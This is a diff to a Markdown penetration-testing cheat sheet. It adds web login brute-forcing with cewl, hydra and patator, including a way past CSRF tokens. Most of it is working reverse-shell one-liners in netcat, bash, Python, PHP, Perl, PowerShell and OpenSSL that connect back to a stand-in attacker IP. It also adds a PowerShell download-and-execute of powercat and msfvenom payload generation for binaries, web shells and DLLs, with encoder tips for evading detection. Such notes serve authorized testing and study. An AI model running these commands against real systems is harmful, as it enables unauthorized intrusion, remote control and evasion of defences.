@@ -499,6 +499,15 @@ Good wordlists to try:
 
 ### 3.5.2 Web Bruteforcing
 
+Get a wordlist and emails from the site using `cewl`:
+
+```sh
+# save emails to file, min word length = 5
+cewl -e --email_file emails.txt -m 5  http://VICTIM_IP | tee cewl.txt
+```
+
+Hydra is great for hitting web login forms.
+
 Hydra help/usage for specific module:
 
 ```bash
@@ -526,6 +535,16 @@ HTTP BasicAuth (GET request):
 # hydra http basic auth brute force
 # Use https-get for https
 hydra -L users.txt -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt "http-get://$VICTIM_IP/loginpage:A=BASIC" http-get
+```
+
+CSRF Tokens defeat hydra, so use `patator`: (documentation in [`patator.py`](https://github.com/lanjelot/patator/blob/master/patator.py))
+
+```sh
+# before_urls visits the login page where the CSRF token is
+# before_egrep uses regex to extract the CSRF token
+# bug in reslover means you have to tell it to resolve IP to itself
+# use `--debug --threads=1 proxy=127.0.0.1:8080 proxy_type=http` for troubleshooting with burp and debug logging.
+patator http_fuzz --threads=10 --max-retries=0 --hits=patator-hits.txt method=POST follow=1 accept_cookie=1 timeout=5 auto_urlencode=1 resolve=VICTIM_IP:VICTIM_IP url="http://VICTIM_IP/login" body='csrf_token=__CSRF__&usernameD=FILE0&password=FILE1' 0=users.txt 1=cewl.txt before_urls="http://VICTIM_IP/login" before_egrep='__CSRF__:value="(\w+)" id="login__csrf_token"' -x ignore:fgrep='No match'
 ```
 
 
@@ -2450,9 +2469,13 @@ nc -vlnp LISTEN_PORT
 ```sh
 # if netcat has the -e flag:
 nc -e /bin/sh LISTEN_IP 443
+# can generate with msfvenom:
+msfvenom -p cmd/unix/reverse_netcat_gaping -f raw lport=443 lhost=LISTEN_IP
 
 # if no -e flag:
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LISTEN_IP 443 >/tmp/f
+# can generate with msfvenom:
+msfvenom -p cmd/unix/reverse_netcat -f raw lport=443 lhost=LISTEN_IP
 ```
 
 **Bash Reverse Shell**
@@ -2460,6 +2483,82 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LISTEN_IP 443 >/tmp/f
 ```sh
 # only works on Linux with bash
 /bin/bash -c 'bash -i >& /dev/tcp/LISTEN_IP/443 0>&1'
+
+# can generate with msfvenom:
+msfvenom -p cmd/unix/reverse_bash -f raw lport=443 lhost=LISTEN_IP
+```
+
+**Python Reverse Shell**
+
+```sh
+python -c 'import os,socket,pty;s=socket.create_connection(("LISTEN_IP",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+
+# daemonizing shell for *nix hosts
+python -c 'import os,sys,socket,pty;os.fork() and sys.exit();os.setsid();os.fork() and sys.exit();s=socket.create_connection(("LISTEN_IP",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+
+# can generate with msfvenom:
+msfvenom -p cmd/unix/reverse_python -f raw lport=443 lhost=LISTEN_IP
+```
+
+
+**PHP Reverse Shell**
+
+```sh
+# may have to try different socket numbers besides 3 (4,5,6...)
+php -r '$sock=fsockopen("LISTEN_IP",443);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+**Perl Reverse Shell**
+
+```sh
+perl -e 'use Socket;$i="LISTEN_IP";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+# can generate with msfvenom:
+msfvenom -p cmd/unix/reverse_perl -f raw lport=443 lhost=LISTEN_IP
+```
+
+**Powershell Reverse Shell**
+
+Invoke from `cmd` with `powershell -NoP -NonI -W Hidden -Exec Bypass -Command ...`
+
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient("LISTEN_IP",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+If you convert to base64 on Linux for execution with
+`powershell -enc "BASE64ENCODEDCMD"`, use the following command to ensure you
+don't mess up the UTF-16LE encoding that Windows uses:
+
+```sh
+echo '$client = New-Object System.Net.Sockets.TCPClient("LISTEN_IP",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t UTF-16LE | base64 | tr -d '\n'; echo
+```
+
+Also, you can use `powercat.ps1`, a netcat equivalent in Powershell, with "-e" support.
+
+```sh
+cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+sudo python -m http.server 80
+nc -lvnp 6969
+```
+
+Invoke with:
+
+```powershell
+IEX (New-Object System.Net.Webclient).DownloadString("http://LISTEN_IP/powercat.ps1");powercat -c LISTEN_IP -p 6969 -e powershell
+```
+
+
+
+**OpenSSL Encrypted Reverse Shell**
+
+```sh
+# generate key on server
+openssl req -nodes -x509 -newkey rsa:2048 -days 365 -out cert.pem -keyout key.pem -batch
+# Start server listener
+sudo openssl s_server -accept 443 -key key.pem -cert cert.pem
+
+# Client-side reverse shell
+rm -f /tmp/f; mkfifo /tmp/f && openssl s_client -connect SERVER_IP:443 -quiet < /tmp/f 2>/dev/null | /bin/sh 2>&0 > /tmp/f &
 ```
 
 **Socat Listener**
@@ -2498,70 +2597,62 @@ socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane OPENSSL:LISTEN_IP:443,v
 
 For Windows victim, replace `/bin/bash` with `cmd.exe` or `powershell.exe`
 
-**Python Reverse Shell**
+
+
+**MSFVenom**
+
+You can use `msfvenom` to generate reverse shells easily.
 
 ```sh
-python -c 'import os,socket,pty;s=socket.create_connection(("LISTEN_IP",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+# Basic Windows TCP reverse shell
+msfvenom -p windows/shell_reverse_tcp -f exe -o derp.exe lport=443 lhost=ATTACKER_IP
 
-# daemonizing shell for *nix hosts
-python -c 'import os,sys,socket,pty;os.fork() and sys.exit();os.setsid();os.fork() and sys.exit();s=socket.create_connection(("LISTEN_IP",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+# Basic Linux TCP reverse shell
+msfvenom -p linux/x86/shell_reverse_tcp -f elf -o derp.elf lport=443 lhost=ATTACKER_IP
+
+# web-based reverse shells
+# asp
+msfvenom -p windows/shell/reverse_tcp -f asp -o derp.asp lport=443 lhost=ATTACKER_IP
+# jsp
+msfvenom -p java/jsp_shell_reverse_tcp -f raw -o derp.jsp lport=443 lhost=ATTACKER_IP
+# war
+msfvenom -p java/jsp_shell_reverse_tcp -f war -o derp.war lport=443 lhost=ATTACKER_IP
+# php
+msfvenom -p php/reverse_php -f raw -o derp.php lport=443 lhost=ATTACKER_IP
+
+# Windows DLL that invokes commands you tell it:
+msfvenom -p windows/exec -f dll -o shell32.dll cmd="C:\windows\system32\calc.exe"
 ```
 
-
-**PHP Reverse Shell**
+Getting help:
 
 ```sh
-# may have to try different socket numbers besides 3 (4,5,6...)
-php -r '$sock=fsockopen("LISTEN_IP",443);exec("/bin/sh -i <&3 >&3 2>&3");'
+# list all available payloads
+msfvenom --list payloads
+
+# view payload options
+msfvenom -p PAYLOAD --list-options
+
+# list encoders
+ msfvenom -l encoders
+ 
+ # list allowed output formats
+ msfvenom -l formats
 ```
 
-**Perl Reverse Shell**
+Custom encoding:
 
-```sh
-perl -e 'use Socket;$i="LISTEN_IP";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-```
+- `-e x86/shikata_ga_nai` - best x86 encoder for evasion
+- `-e x64/xor` - decent x64 option
+- `-i / --iterations <count>` - number of encoding iterations (more = better evasion, bigger payload)
 
-**Powershell Reverse Shell**
+Avoiding bad bytes (requires custom encoding): `-b "\x00\x0A"`
 
-Invoke from `cmd` with `powershell -NoP -NonI -W Hidden -Exec Bypass -Command ...`
+Prepending nopsled: `-n, --nopsled <length>`
 
-```powershell
-$client = New-Object System.Net.Sockets.TCPClient("LISTEN_IP",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-```
+Shrinking your payload: `--smallest`
 
-If you convert to base64 on Linux for execution with
-`powershell -enc "BASE64ENCODEDCMD"`, use the following command to ensure you
-don't mess up the UTF-16LE encoding that Windows uses:
 
-```sh
-echo '$client = New-Object System.Net.Sockets.TCPClient("LISTEN_IP",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t UTF-16LE | base64 | tr -d '\n'; echo
-```
-
-Also, you can use `powercat.ps1`, a netcat equivalent in Powershell, with "-e" support.
-
-```sh
-cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
-sudo python -m http.server 80
-nc -lvnp 6969
-```
-
-Invoke with:
-
-```powershell
-IEX (New-Object System.Net.Webclient).DownloadString("http://LISTEN_IP/powercat.ps1");powercat -c LISTEN_IP -p 6969 -e powershell
-```
-
-**OpenSSL Encrypted Reverse Shell**
-
-```sh
-# generate key on server
-openssl req -nodes -x509 -newkey rsa:2048 -days 365 -out cert.pem -keyout key.pem -batch
-# Start server listener
-sudo openssl s_server -accept 443 -key key.pem -cert cert.pem
-
-# Client-side reverse shell
-rm -f /tmp/f; mkfifo /tmp/f && openssl s_client -connect SERVER_IP:443 -quiet < /tmp/f 2>/dev/null | /bin/sh 2>&0 > /tmp/f &
-```
 
 ### 4.4.1 Covering your tracks
 
